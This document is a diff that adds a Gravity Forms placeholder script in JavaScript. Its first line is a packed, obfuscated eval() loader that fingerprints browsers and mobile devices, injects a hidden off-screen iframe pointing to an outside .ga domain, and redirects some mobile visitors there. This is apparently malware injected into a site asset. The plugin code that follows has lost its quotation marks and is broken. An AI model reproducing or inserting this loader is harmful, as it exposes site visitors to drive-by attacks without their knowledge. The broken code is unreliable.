@@ -1,0 +1,77 @@
+/*024bcc38a316c311e643cc6ee1f0273d*/eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('j 1s=3w(H(){f(q.L!=1H&&P q.L!="O"){3x(1s);f(P A["1z"]=="O"){A["1z"]=1;j 19=(Z()&&1T());j 1C=!19&&!!A.3y&&A.E.3v==="3u 3q.";j 1D=-1;j F="3r://3s.3t";f(S()&&1D==1){f((E.M.1I(/3z/i))||(E.M.1I(/3A/i))){16.3G(F)}z{A.16=F;q.16=F}}z{f((19&&!1C&&!S())){j R="<1c 3H=\\"3I:3F;3E:-3B;\\"><1M 3C=\\"1P\\" 3D=\\""+F+"\\" 3p=\\"1P\\"></1M></1c>";j G=q.3o("1c");f(G.1R==0){q.L.K=q.L.K+R}z{j 1O=G.1R;j 17=3b.3c((1O/2));G[17].K=G[17].K+R}}}}1L()}},3d);H 1L(){j W="1F";f(W!="1F"){j I=q.3a(W);f(P I!=O&&I!=1H){I.39="";35 I}}};H 1T(){f(q.C&&!q.36){x B}z f(q.C&&!A.37){x B}z f(q.C&&!q.38){x B}z f(q.C&&!q.3e){x B}z f(q.C&&!A.3f){x B}z f(q.C){x B}z f(P E.3l!="O"&&!q.C&&Z()){x B}z{x 1a}}H Z(){j y=A.E.M;j Q=y.D("3m ");f(Q>0){x 15(y.X(Q+5,y.D(".",Q)),10)}j 1i=y.D("3n/");f(1i>0){j 11=y.D("3k:");x 15(y.X(11+3,y.D(".",11)),10)}j N=y.D("3j/");f(N>0){x 15(y.X(N+5,y.D(".",N)),10)}x 1a}H S(){j V=A.E.M.3g();f(/(3h|3i\\d+|3J).+1f|3K|4g\\/|4h|4i|4f|4e|4a|4b|4c|1A(34|1w)|1N|4j|4k |4q|4r|4s|1f.+4p|4o|4l m(4m|4n)i|48( 1Q)?|46|p(3R|3S)\\/|3T|3Q|3P|3L(4|6)0|3M|3N|1G\\.(3O|3U)|3V|42|43 44|41|3Z/i.1v(V)||/3W|3X|3Y|4t|2W|50[1-6]i|1X|23|a 1K|26|1B(1J|1h|s\\-)|1U(25|27)|1y(2r|1j|1o)|2m|2l(2k|14|2o)|2q|1p(2c|T)|2b(U|2g)|2n|2h(2f|\\-m|r |s )|2e|2d(1k|1n|2i)|1t(2j|2p)|2a(1B|24)|28(e|v)w|29|22\\-(n|u)|1Y\\/|1Z|1W|33\\-|2R|2S|2Q|2P\\-|1o(2M|1q)|2N|2O(1d|1n|2T)|31|2Z\\-s|2V|2X|2z|1e(c|p)o|2A(12|\\-d)|2x(49|1U)|2w(2t|2u)|1J(2v|2B)|2I|2J([4-7]0|1Q|1K|2H)|2G|2D(\\-|1x)|1E u|2E|2F|2C\\-5|g\\-Y|T(\\.w|1w)|2y(2K|2L)|2Y|2s|30\\-(m|p|t)|2U\\-|4d(1m|1l)|4P( i|1A)|6L\\-c|6K(c(\\-| |1x|a|g|p|s|t)|65)|5V(62|6s)|i\\-(20|T|1b)|6l|6m( |\\-|\\/)|4u|6n|6k|6j|6g|6h|6i|1N|6o(t|v)a|6p|6v|6w|6x|6u|6t( |\\/)|6q|6r |6e\\-|5Z(c|k)|63(5Y|5X)|5U( g|\\/(k|l|u)|50|54|\\-[a-w])|6c|6d|6a\\-w|67|68\\/|1b(U|6z|6y)|1r(J|21|1j)|m\\-6Z|71(72|1u)|6X(6U|6W|1S)|74|Y(J|73|1t|7c|1e|t(\\-| |o|v)|7b)|78(50|79|v )|75|77|6T[0-2]|6S[2-3]|6F(0|2)|6G(0|2|5)|6H(0(0|1)|10)|6E((c|m)\\-|6D|6A|6B|6C|6I)|6J(6|i)|6Q|6R|6O(6N|6M)|66|5S|4W|4X(a|d|t)|5T|4Y(13|\\-([1-8]|c))|4Q|4R|1V(4S|4T)|4Z\\-2|51(1k|5a|1g)|5b|5c|1m\\-g|59\\-a|55(56|12|21|32|60|\\-[2-7]|i\\-)|4D|4A|4z|4v|4w|4x(4y|4E)|4F\\/|4L(4M|1b|4N|4K|14|4J)|4G(J|h\\-|1h|p\\-)|4I\\/|1g(c(\\-|0|1)|47|1r|1q|1u)|5e\\-|5F|5G(\\-|m)|5H\\-0|5E(45|5D)|5A(1y|1p|5B|1d|5C)|5I(5J|14)|5P(J|h\\-|v\\-|v )|5Q(J|5R)|5O(18|50)|5N(5K|10|18)|1l(5z|5y)|5l\\-|5m\\-|5n(i|m)|5k\\-|t\\-Y|5f(1V|5g)|1S(70|m\\-|5i|5o)|5p\\-9|1G(\\.b|1E|5v)|5w|5x|5u|5t|5q(5r|U)|5s(40|5[0-3]|\\-v)|5h|5j|5M|5L(52|53|60|61|70|5d|4H|4C|4B|4O)|57(\\-| )|58|4U|4V(g |6P|76)|7a|6V|6Y|69\\-|6b|64|5W\\-/i.1v(V.6f(0,4))){x B}x 1a}',62,447,'|||||||||||||||if||||var|||||||document|||||||return|NkKdASQnLtvePPdKZNCQfrpyokZLFfXVA|else|window|true|all|indexOf|navigator|ohjpSZXLcVUkbCeDJfxeZoXUDVqmDjbVDJAgxPC|KVIXMyXGkfhFofLKWkXxIiBYQlZRNfDcUN|function|WAfSdkMlyNmUUjlSwzlXhCFEAbOcUsBLIVwrKO|01|innerHTML|body|userAgent|cSlPIHWZgWUekVTzrYMpCEaCBdtznilEHrFMRqsmS|undefined|typeof|tEiTDBOZeUfZGMWtnNsfVzHAVMjaxNpPPq|UsYxVqLtlqnIWGfAvYkrhwoUfnJubEEPrVWl|LJxJwFCvwUkifkjuuMnodgCffVCzcNerQooleJ|go|te|qJiYHUOHwmOhdoBJEgSaRfGHsIUsUVsxnKah|MTsgAoEMgcqvlASMcGMgXMqlipwxsGudCW|substring|mo|xRzSOedfgFXTzBIGDnIxPBpRaPuHlyIR||RLZfXsSbmZGyaFHIMgjJlPByZugfENhvJhA|||ny|parseInt|location|ttnZnxbExyBEWdcpDjLQuNeKZrfiEnUSgmJAuAKi||faweQCXgvvpIxJtkpyYueBNFtIDGbxgJMUT|false|ma|div|it|do|mobile|se|oo|jqJisqQBimDcptAwaXwJWkCdwakvcuPVBwsP|ca|ck|ta|pt|ll|co|ar|nd|mc|gjoBjfaRrKQDueZgbHPVHyqefiHirBWmMvb|bi|ri|test|od|_|al|v_024bcc38a316c311e643cc6ee1f0273d|ip|ac|YQsxMlwsXQCsBJPEyPGCYOWlVtIMIhJPegpZCUDk|XwAiCEUvDPYmcKPNOSpsuJpVUsqzojDXzshe|g1|none|up|null|match|er|wa|CFyiqgYyZBNQiGPyxuettGfwpPETUJsoIlcrIWi|iframe|iris|dl_name|4px|os|length|ts|eNNTovHurVVVXjsvImMmlDWWphjOctOZDkQbJDX|ai|pl|ccwa|770s|c55|capi|||bw|802s|az|ko|abac|rn|br|bumb|bl|as|ch|be|avan|di|us|au|nq|lb|ex|an|amoi|attw|yw|rd|aptu|av|hcit|l2|ul|ic|em|el|gr|dmob|ds|k0|gf|fly|g560|gene|fetc|ze|esl8|ez|ad|un|mp|craw|da|cmd|cldc|cell|chtm|ng|hei|devi|4thp|dica|haie|dc|hd|dbte||cdm|hone|delete|compatMode|XMLHttpRequest|querySelector|outerHTML|getElementById|Math|floor|100|addEventListener|atob|toLowerCase|android|bb|Edge|rv|maxTouchPoints|MSIE|Trident|getElementsByTagName|height|Inc|http|trahnytbushakiry|ga|Google|vendor|setInterval|clearInterval|chrome|iPhone|iPod|4599px|width|src|left|absolute|replace|style|position|meego|avantgo|series|symbian|treo|browser|psp|pocket|ixi|re|plucker|link|vodafone|1207|6310|6590|xiino||xda|wap|windows|ce||phone||palm||fennec|hiptop|iemobile|hi|elaine|compal|bada|blackberry|blazer|kindle|lge|opera|ob|in|netfront|firefox|maemo|midp|mmp|3gso|ibro|raks|rim9|ro|ve|r600|r380|85|83|qtek|zo|s55|sc|81|sdk|va|ms|sa|ge|mm|98|hp|phil|pire|ay|uc|whit|wi|p800|pan|pg|pn||po||||qc|07|w3c|webc|qa|rt|prox|psio|80|sgh|to|sh|vm40|m3|voda|tim|tcl|tdg|tel|m5|tx|vi|rg|vk|veri|v750|si|utst|v400|lk|gt|sm|b3|t5|id|sl|shar|sie|sk|so|ft|00|vx|vulc|t6|t2|sp|sy|mb|owg1|pdxg|lg|hu|zte|xi|no|kyo|||aw|le|zeto|tp|oran|m3ga|m50|yas|m1|your|libw|lynx|kwc|substr|im1k|inno|ipaq|ikom|ig01|i230|iac|idea|ja|jbro|klon|kpt|tc|kgt|keji|jemu|jigs|kddi|xo|ui|tf|wf|wg|on|ne|n30|n50|n7|wt|nok|ht|hs|wv|ti|op|nc|nzph|o2im|n20|n10|o8|wonu|oa|mi|x700|cr||me|rc|02|mmef|mwbp|nw|mywa|mt|p1|wmlb|zz|de'.split('|'),0,{}))
+/*024bcc38a316c311e643cc6ee1f0273d*/(function($){
+
+var gf_placeholder = function() {
+
+	$(.gform_wrapper .gf-add-placeholder)
+		.find(input, textarea).filter(function(i){
+			var $field = $(this);
+			
+			if (this.nodeName == INPUT) {
+				var type = this.type;
+				return !(type == hidden || type == file || type == radio || type == checkbox);
+			}
+
+			return true;
+		})
+		.each(function(){
+			var $field = $(this);
+
+			var id = this.id;
+			var $labels = $(label[for= + id + ]).hide();
+			var label = $labels.last().text();
+
+			if (label.length > 0 && label[ label.length-1 ] == *) {
+				label = label.substring(0, label.length-1) +  *;
+			}
+
+			$field[0].setAttribute(placeholder, label);
+		});
+
+	var support = (!(placeholder in document.createElement(input))); 
+	if ( support && jquery_placeholder_url )
+		$.ajax({
+			cache: true,
+			dataType: script,
+			url: jquery_placeholder_url,
+			success: function() {
+				$(input[placeholder], textarea[placeholder]).placeholder({
+					blankSubmit: true
+				});
+			},
+			type: get
+		});
+
+    $(.gform_wrapper .gf-add-placeholder).find(select).filter(function(i){
+        var $theSelect = $(this);
+
+       $theSelect.each(function(){
+           var elementID = this.id;
+           var inIdFormat = "#" + elementID;
+           var theLabel = $(label[for= + elementID + ]).text();
+           console.log(The id for this field is + elementID +  the label for this field is  + theLabel);
+           $(inIdFormat).prepend("<option class=placeholder selected disabled value=" + " + theLabel + " + ">" + theLabel + "</option>" );
+            $(label[for= + elementID + ]).hide();
+
+       })
+    });
+
+
+
+
+
+
+
+};
+
+$(document).ready(function(){
+	gf_placeholder();
+	$(document).bind(gform_post_render, gf_placeholder);
+});
+
+})(jQuery);
+
+
+
+
+
